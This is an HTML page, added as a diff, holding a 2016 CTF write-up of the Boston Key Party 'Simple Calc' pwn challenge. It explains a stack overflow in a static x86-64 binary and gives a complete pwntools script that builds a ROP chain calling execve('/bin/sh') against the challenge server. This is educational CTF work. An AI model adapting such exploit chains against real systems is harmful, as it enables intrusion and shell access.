@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+
+
+
+<title>
+  Grazfather - Boston Key Party - PWN 5 ‘Simple Calc’ 
+</title>
+
+<meta name="generator" content="Hugo 0.73.0" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,400|Roboto+Slab:400,700|Roboto:300,300i,400,400i,500,500i,700,700i">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
+<link rel="stylesheet" href="https://grazfather.github.io/css/main.css">
+<link rel="stylesheet" href="https://grazfather.github.io/css/custom.css">
+
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="theme-color" content="#ffffff">
+
+</head>
+<body lang="en-US">
+<div class="container">
+
+
+<header class="row text-left title">
+  <h1 class="title">Boston Key Party - PWN 5 ‘Simple Calc’</h1>
+</header>
+<section id="category-pane" class="row meta">
+  
+  <div class="col-md-12">
+    <h6 class="text-left meta">
+        PUBLISHED ON MAR 6, 2016 
+      
+      
+      
+      —
+      
+      
+      <a class="meta" href="/categories/ctf">CTF</a>, 
+      
+      <a class="meta" href="/categories/pwn">PWN</a>
+      
+      
+      
+    </h6>
+  </div>
+  
+</section>
+<section id="content-pane" class="row">
+  <div class="col-md-12 text-justify content">
+    
+    <nav id="TableOfContents"></nav>
+    
+    <p>Running strings we see this is a x86_64 binary <em>statically compiled</em>, which should make things a lot easier for us.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vagrant@kali:/vagrant/ctfs/bostonkp2016$ file simplecalc
+simplecalc: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>GNU/Linux<span style="color:#f92672">)</span>, statically linked, <span style="color:#66d9ef">for</span> GNU/Linux 2.6.24, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>0x0676a83cc38d2b9b20c612f4d7a19255eaa93b52, not stripped</code></pre></div>
+<p>Running the application, with IDA open on the side to quickly get past any restriction, I see that this program simply takes some number of calculations and then for each it allows you to choose wish operation to perform and the two operands. Both operands must be greater than 39, and the input and result are 4 byte ints. There are 12 global variables, three for each operation, and one for each operand and the result, plus four bytes padding between each set to maintain alignment.</p>
+<p>When you first choose how many calculation to make, an appropriately size buffer is <code>malloc</code>ed and the result of each is saved. If you decide to quit out early, then the buffer is <code>memcpy</code>d to a buffer on the stack, which gives us our stack smashing opportunity &ndash; Just select more operations than the stack buffer can fit the results for. This will, however, overwrite the pointer to the alloc&rsquo;d buffer, causing the <code>free</code> call to crash, but we can easily get around that: <code>free(0)</code> short circuits and returns, so all we need to do is overwrite the stack will nulls, which we can do by subtracting some number from itself.</p>
+<p>Now that I have RIP, I need to exploit it. Stack is NX, and I can&rsquo;t find &ldquo;/bin/*sh&rdquo; in a static part of the binary, nor is there a <code>system</code>. This rules out ret2libc, and we will have to do a ROP.</p>
+<p>This was my first non-trivial ROP (and some would argue it&rsquo;s still trivial), so I will go into how I did it.</p>
+<p>First I needed to figure out how to make the syscall. I found some simple shellcode <a href="http://imgur.com/HbgCv5u">here</a>, and figured out what it was doing:</p>
+<ul>
+<li>Set AL to 0x3B</li>
+<li>Set RDX to NULL</li>
+<li>Set RDI to point to &ldquo;/bin/sh\0&rdquo;</li>
+<li>Set RSI to point to a pointer to &ldquo;/bin/sh\0&rdquo; followed by NULL.</li>
+</ul>
+<p>Since we are on x86_64, this requires two &lsquo;operations&rsquo; so that we write eight bytes. This also gives us another problem: The stack location is unpredictable, where do we put this arg array and string? Lucky for us, we have easily controllable global vars. Once we set up the ROP chain on the stack, we can re-run dummy operations to overwrite the global &lsquo;cache&rsquo; of operands and results.</p>
+<p>To do this I simply &lsquo;divided&rsquo; &ldquo;/bin&rdquo; by &ldquo;/sh\0&rdquo;, which puts &ldquo;/bin/sh\0&rdquo; at the <code>divv</code> symbol. For the array, it was a bit trickier: I needed something with 12 NULL bytes after (4 to cover the second half of the pointer, and 8 more for the second elements). Since <code>sub</code> was at the end, I could do this. I put the address of <code>divv</code> as both operands of a sub operation, which would result in a NULL result, plus the four bytes following would be NULL (since the section is .bss). Unfortunately I hit another problem: In practice, a symbol soon after the sub result, <code>_dl_tls_static_used</code> was set to 0x60. To get around this, I would need an extra ROP gadget to write over this value with 0.</p>
+<p>In the end, I ended up with what I think is a pretty elegant solution:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> struct
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_addr</span>(addr):
+    <span style="color:#66d9ef">return</span> ADD <span style="color:#f92672">+</span> str(addr<span style="color:#f92672">-</span><span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;40</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> NULL
+
+<span style="color:#75715e"># Commands</span>
+ADD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+SUB <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+MUL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;3</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+DIV <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+DONE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;5</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+NULL <span style="color:#f92672">=</span> SUB<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;40</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;40</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#75715e"># Gadgets</span>
+POP_RDI <span style="color:#f92672">=</span> write_addr(<span style="color:#ae81ff">0x00401b73</span>)
+POP_RAX <span style="color:#f92672">=</span> write_addr(<span style="color:#ae81ff">0x0044db34</span>)
+POP_RDX <span style="color:#f92672">=</span> write_addr(<span style="color:#ae81ff">0x00437a85</span>)
+POP_RSI <span style="color:#f92672">=</span> write_addr(<span style="color:#ae81ff">0x00401c87</span>)
+MOV_EDX_TO_AT_RAX <span style="color:#f92672">=</span> write_addr(<span style="color:#ae81ff">0x0044526f</span>)
+SYSCALL <span style="color:#f92672">=</span> write_addr(<span style="color:#ae81ff">0x004648e5</span>)
+<span style="color:#75715e"># Globals</span>
+addX <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6C4A80</span>
+addY <span style="color:#f92672">=</span> addX <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+addRes <span style="color:#f92672">=</span> addY <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+divX <span style="color:#f92672">=</span> addRes <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
+divY <span style="color:#f92672">=</span> divX <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+divRes <span style="color:#f92672">=</span> divY <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+mulX <span style="color:#f92672">=</span> divRes <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
+mulY <span style="color:#f92672">=</span> mulX <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+mulRes <span style="color:#f92672">=</span> mulY <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+subX <span style="color:#f92672">=</span> mulRes <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
+subY <span style="color:#f92672">=</span> subX <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+subRes <span style="color:#f92672">=</span> subY <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+_dl_tls_static_used <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6C4AC0</span>
+
+<span style="color:#75715e"># Build commands</span>
+commands <span style="color:#f92672">=</span> [
+    <span style="color:#e6db74">&#34;100</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,  <span style="color:#75715e"># Any large number</span>
+    NULL<span style="color:#f92672">*</span><span style="color:#ae81ff">18</span>,  <span style="color:#75715e"># Get to RA</span>
+    <span style="color:#75715e"># Set _dl_tls_static_used to 0</span>
+    POP_RAX,
+    write_addr(_dl_tls_static_used),
+    POP_RDX,
+    NULL, NULL,
+    MOV_EDX_TO_AT_RAX,
+    <span style="color:#75715e"># Now get ready for syscall</span>
+    POP_RDI,
+    write_addr(divX),  <span style="color:#75715e"># divX holds the string &#34;/bin/sh&#34;</span>
+    POP_RAX,
+    SUB <span style="color:#f92672">+</span> str(<span style="color:#ae81ff">0x3b</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4096</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;4096</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> NULL,  <span style="color:#75715e"># 0x3b = execve</span>
+    POP_RDX,
+    NULL, NULL,  <span style="color:#75715e"># RDX should be null</span>
+    POP_RSI,  <span style="color:#75715e"># RSI should point to an array that has a pointer to &#34;/bin/sh&#34; and a null pointer</span>
+    write_addr(subY),
+    SYSCALL,
+    <span style="color:#75715e"># Now we need to populate the global vars by running extra calcs</span>
+    <span style="color:#75715e"># -- Put &#34;/bin/sh&#34; at addX</span>
+    DIV <span style="color:#f92672">+</span> str(struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin&#34;</span>)[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
+    str(struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
+    <span style="color:#75715e"># -- Put pointer to divX at subY with null after</span>
+    SUB <span style="color:#f92672">+</span> str(divX) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> str(divX) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
+    DONE
+]
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;simplecalc.bostonkey.party&#34;</span>, <span style="color:#ae81ff">5400</span>)
+garbage <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recv()
+r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(commands))
+r<span style="color:#f92672">.</span>interactive()</code></pre></div>
+
+  </div>
+</section>
+<section id="tag-pane" class="row meta">
+  
+  <div class="col-md-12">
+    <h6 class="text-right meta">
+      
+    </h6>
+  </div>
+  
+</section>
+
+
+
+
+
+
+
+
+<section id="menu-pane" class="row menu text-center">
+  
+  
+  <span><a class="menu-item" href="https://grazfather.github.io/posts/2016-02-14-sharif-ctf-re100-android-app-writeup/">&lt; prev | </a></span>
+  
+  
+  <span><a class="menu-item" href="/posts">posts</a></span>
+  
+  
+  <span><a class="menu-item" href="https://grazfather.github.io/posts/2016-03-06-bkp-pwn5-complex-calc/"> | next &gt;</a></span>
+  
+  
+  <h4 class="text-center"><a class="menu-item" href="https://grazfather.github.io">home</a></h4>
+</section>
+
+
+
+<footer class="row text-center footer">
+  <hr />
+  
+  <h6 class="text-center copyright"></h6>
+  
+      
+      <h6><a href="" aria-label="RSS Feed"><i class="fas fa-rss" aria-hidden="true"></i></a></h6>
+    
+  
+</footer>
+
+</div>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  
+
+<script type="text/javascript">
+hljs.initHighlightingOnLoad();
+</script>
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="js/main.js"></script>
+<script src="js/custom.js"></script>
+</body>
+</html>
+
+
